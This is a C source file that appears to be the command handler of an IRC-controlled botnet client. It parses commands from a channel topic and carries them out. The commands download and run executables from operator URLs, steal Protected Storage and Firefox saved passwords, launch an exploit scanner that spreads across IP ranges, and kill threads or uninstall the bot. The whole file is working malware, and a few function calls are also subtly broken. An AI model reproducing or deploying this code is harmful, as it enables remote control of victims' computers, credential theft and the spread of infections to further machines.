#include "Inc.h"
#include "Fun.h"
#include "Ext.h" //if there is no | in topic it processes all commands like before, but if there is a '|' it checked trough these commands
#include "cmd.h"

char sep = '|'; //seperate char

/*BOOL ParseTopic(char *topic, SOCKET sock, char *target, bool notice,unsigned char parameters[256],char host[160], char *x,char *line,int repeat) {
	if(topic != NULL) {
		char command[128];
		char *p1, *p2;
		int i;

		p1 = strchr(topic, sep);

		if(p1 == NULL) {
/*			enc_privmsg(sock, target, "only one command found", 0);
			RunCommand(topic, sock, target,notice);*/
	/*		return FALSE;
		}
		else {
			//enc_privmsg(sock, target, "more commands found", 0);
			p1 = topic;
			while((p2 = strchr(p1, sep)) != NULL) {
				*p2 = '\0';
				strcpy(command, p1);
				i = find_first_nonwhite_character(p1);
				if(i > 0) strcpy(command, &p1[i]);
				for(i = strlen(command)-1;isspace(command[i]);i--) command[i] = '\0';
				RunCommand(command, sock, target,notice,parameters,host,x,line,repeat);
				p1 = p2++;
				p1++;
			}
		}
	}
	return FALSE;
} */

int iswhite(char c)
{ //sux function taken from wikipedia, isspace() from ctype.h might be better..
  int is_white_char(c <= 0x20 || c >= 0x7F);
  return is_white_char;
}

size_t find_first_nonwhite_character(char *str, size_t start_pos)
{
   size_t lpos;
   for (lpos=start_pos; lpos < strlen(str); lpos++)
     if (iswhite(str[lpos]) == 0)
       break;
 
   return lpos;
}

/*
		s = 4;
		a[4]++;
		a[2] = a[3];

  0						  1   2     3     4
  :irc.impact-media.me.uk 332 dT_Tb #test :.windows.key
  */

BOOL RunCommand(char *cmd, SOCKET sock, char *target, BOOL notice,unsigned char parameters[256],char host[160], char *x,char *line,int repeat) {
	if(cmd != NULL && cmd[0] == prefix) {
		int i = 4,s = 4;
		char *a[MAXTOKENS];
		char *p;

		p = strtok(cmd, " ");

		while(p != NULL) {
			a[i] = p;
			p = strtok(NULL, " ");
			i++;
		}
		a[2] = target;
		a[s]++;
		//
		BOOL silent = FALSE;
		if (parameters['s']) silent=TRUE;
		char sendbuf[IRCLINE];
		memset(sendbuf, 0, sizeof(sendbuf));
		DWORD id = 0;

// copy paste commands check here ------> //

				#ifndef NO_DOWNLOAD
			if ((strcmp("update", a[s]) == 0) || (strcmp("up", a[s]) == 0)) {
				if (strcmp(botid, a[s+2]) != 0) {
					char tempdir[MAX_PATH], tmpbuf[MAXNICKLEN];
					GetTempPath(sizeof(tempdir), tempdir);

					DOWNLOAD dl;
					strncpy(dl.url,  a[s+1], sizeof(dl.url)-1);
					sprintf(dl.dest, "%s%s.exe", tempdir, rndnickletter(tmpbuf));
					dl.update = 1;
					dl.run = 0;
					dl.filelen=((a[s+3])?(atoi(a[s+3])):(0));
					dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
					dl.encrypted=(parameters['e']);

					dl.sock = sock;
					strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
					dl.notice=notice;
					dl.silent = silent;

					sprintf(sendbuf, "[UPDATE]: Downloading update from: %s.", a[s+1]);
					dl.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
					if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
						while(dl.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"[UPDATE]: Failed to start download thread, error: <%d>.", GetLastError());
				} else
					sprintf(sendbuf,"[UPDATE]: Bot ID must be different than current running process.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif

#ifndef NO_PATCHER
		//else if (strcmp(a[0], "patch") == 0)
	  else if (strcmp(patch_cmd, a[s]) == 0)
			
		{
			if (!checkos())
				return 1;

			PATCHER patcher;
			patcher.Sock = sock;
			patcher.Silent = silent;
			patcher.GotInfo = FALSE;
			//patcher.ThreadNum = addthread(PATCHER_THREAD);
			patcher.ThreadNum = addthread(sendbuf,PATCHER_THREAD,NULL);
			threads[patcher.ThreadNum].tHandle = CreateThread(NULL, 0, &PatcherThread, (LPVOID)&patcher, 0, &id);
			while (patcher.GotInfo == FALSE)
				Sleep(30);

			return 1;
		}
#endif
		else if (strcmp(killthreads_cmd, a[s]) == 0) {
				if (strcmp("all", a[s+1]) == 0) {
					if ((i=killthreadall()) > 0)
						sprintf(sendbuf,"%s Stopped: %d thread(s)", mn_title,i);
					else
						sprintf(sendbuf,"%s No active threads found",mn_title);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);					
				} else {
					for (i = s+1; i < (sizeof(a)/4); i++) {
						if (a[i]==NULL) break;
					
						if (killthread(atoi(a[i])))
							sprintf(sendbuf,"%s Killed thread: %s",mn_title,a[i]);
						else 
							sprintf(sendbuf,"%s Failed to kill thread: %s",mn_title,a[i]);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}

				return 1;
			}

		else if (strcmp(pstore_cmd, a[s]) == 0 || strcmp (pstore2_cmd, a[s]) == 0) {
				pststrct pStorInfo;
				pStorInfo.sock = sock;
				strcpy(pStorInfo.chan,a[2]);
				sprintf(sendbuf, "-=PSTORE=- Executed.",  mn_title, version);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
				CreateThread(NULL, 0, &pstore, (LPVOID)&pStorInfo, 0, 0);
			}

           else if (strcmp(firefox_cmd, a[s]) == 0) {
				if(!fGetUserProfileDirectory){return 1;}
				FindFirefoxPasses(sock, channel, notice);
				irc_privmsg(sock, channel, "-=FIREFOX=- Executed.", notice); 
				return 1;
			}

#ifndef NO_ADVSCAN
		else if (strcmp(advscan_cmd, a[s]) == 0) {
				int scanthreads=findthreadid(SCAN_THREAD);
				if (scanthreads + atoi(a[s+2]) > MAXSCANTHRD) {
					sprintf(sendbuf ,"%s already %d threads. too many specified", sc_title,scanthreads);
					irc_privmsg(sock,a[2],sendbuf,notice);
				} else {
					ADVSCAN advscan;
					advscan.port = atoi(a[s+1]); 
					advscan.threads = atoi(a[s+2]);
					advscan.delay = atoi(a[s+3]);
					advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
					advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
					advscan.minutes = atoi(a[s+4]);
					advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
					advscan.exploit = -1;

					for(i=0;exploit[i].port != 0;i++) {
						if (strcmp(exploit[i].command, a[s+1]) == 0) {
							advscan.port = exploit[i].port;
							advscan.exploit = i;

							break;
						}
					}

					if (advscan.port == 0) {
						sprintf(sendbuf, "%s failed to start, syntax is invalid",sc_title);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);

						return 1;
					}

					//if (a[s+5] && a[s+5][0] != '#') {
					if (a[s+5] && a[s+5][0] != '#' && a[s+5][0] != '-') {
			/*		sprintf(sendbuf, "5th Parameter is: %s", a[s+5]);
					irc_privmsg(sock,a[2],sendbuf,notice); */
						_snprintf(advscan.ip,sizeof(advscan.ip),a[s+5]);
						advscan.random = ((strchr(a[s+5],'x'))?(TRUE):(FALSE));
					} else {
					//	if (parameters['a'] || parameters['b'] || parameters['r']) {
//						if (parameters['a'] || parameters['b'] || parameters['r'] || a[s+5][1] == 'r') {
						if (parameters['a'] || parameters['b'] || parameters['r'] || a[s+5][1] == 'a' || a[s+5][1] == 'b' || a[s+5][1] == 'r') {
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
							ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

				//			if (parameters['r']) {
							if (parameters['r'] || a[s+5][1] == 'r') {
								int extractip = ((parameters['a']) ? 3 : 2);
								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
								advscan.random = TRUE;
							} else
								advscan.random = FALSE;
						} else {
							sprintf(sendbuf, "%s failed to start, no range specified",sc_title);
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);
							
							return 1;
						}
					}

					advscan.sock = sock;
					advscan.notice = notice;
					advscan.silent = silent;
					_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
					if (a[s+6])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+6]);
					else if (a[s+5] && a[s+5][0] == '#')
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
					else if (strcmp(exploitchan,"") != 0)
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
					else
						advscan.msgchan[0] = '\0';

						sprintf(sendbuf, "%s %s Method started at %s :%s for %d minutes %d delay %d threads", 
							sc_title, ((advscan.random)?("Random"):("Sequential")), advscan.ip, exploit[i].name, advscan.minutes, advscan.delay, advscan.threads);
						advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
					if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
						while(advscan.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"%s Failed to start thread, error: %d", sc_title,GetLastError());

					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);

					return 1;
				}
			}
#endif

			 else if (strcmp(removebot_cmd, a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "Removing Bot",notice);
#ifdef DEBUG_LOGGING
				closedebuglog();
#endif
				fclosesocket(sock);
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			}

			else if (strcmp(join_cmd, a[s]) == 0) {
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
				addlogv("Joined channel: '%s'.",a[s+1]);

				return repeat;
			}

			else if (strcmp(part_cmd, a[s]) == 0) {
				irc_sendv(sock, "PART %s\r\n", a[s+1]);
				addlogv("Parted channel: '%s'.",a[s+1]);

				return repeat;
			}

			#ifndef NO_DOWNLOAD
			else if (strcmp("download_cmd", a[s]) == 0 || strcmp("dl", a[s]) == 0) {
				DOWNLOAD dl;
				strncpy(dl.url, a[s+1], sizeof(dl.url)-1);
				strncpy(dl.dest, a[s+2], sizeof(dl.dest)-1);
				dl.update = 0;
				dl.run = ((a[s+3])?(atoi(a[s+3])):(0));
				dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
				dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
				dl.encrypted=(parameters['e']);

				dl.sock = sock;
				strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
				dl.notice=notice;
				dl.silent = silent;

				sprintf(sendbuf, "[DOWNLOAD]: Downloading URL: %s to: %s.", a[s+1], a[s+2]);
				dl.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
				if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
					while(dl.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[DOWNLOAD]: Failed to start transfer thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
				
				return 1;
			}
			#endif

				else if (strcmp(privatemessage_cmd, a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						irc_privmsg(sock, a[s+1], y, FALSE);
						addlogv("Privmsg: %s: %s", a[s+1], y);
					}
				}

				return repeat;
			}

/*			if (strcmp("my.command.1", a[s]) == 0) {
				irc_privmsg(sock, a[2], "my.command.1..", notice);
			}
			else if (strcmp("my.command.2", a[s]) == 0) {
				irc_privmsg(sock, a[2], "my.command.2..", notice);
			}
			else if (strcmp(systeminfo_cmd, a[s]) == 0) { //is it inclluded?
				irc_privmsg(sock, a[2], sysinfo(sendbuf, sock), notice);
				addlog("System Info");

				return repeat;
			}
			else if (strcmp(myip_cmd, a[s]) == 0) {
				sprintf(sendbuf ,"%s %s", mn_title,GetIP(sock));
				irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1; 
			} */
		
// <----- end of commands check
		return TRUE;	
	}
	return FALSE;
}

BOOL _parsetopic(char *topic, SOCKET sock, char *target, bool notice,unsigned char parameters[256],char host[160], char *x,char *line,int repeat) {
	if(topic != NULL) {
		char command[128];
		char *p1, *p2;
		int i;

		p1 = strchr(topic, sep);

		if(p1 == NULL) {
/*			enc_privmsg(sock, target, "only one command found", 0);
			RunCommand(topic, sock, target,notice);*/
			return FALSE;
		}
		else {
			//enc_privmsg(sock, target, "more commands found", 0);
			p1 = topic;
			while((p2 = strchr(p1, sep)) != NULL) {
				*p2 = '\0';
				strcpy(command, p1);
				i = find_first_nonwhite_character(p1);
				if(i > 0) strcpy(command, &p1[i]);
				for(i = strlen(command)-1;isspace(command[i]);i--) command[i] = '\0';
				RunCommand(command, sock, target,notice,parameters,host,x,line,repeat);
				p1 = p2++;
				p1++;
			}
		}
	}
	return FALSE;
}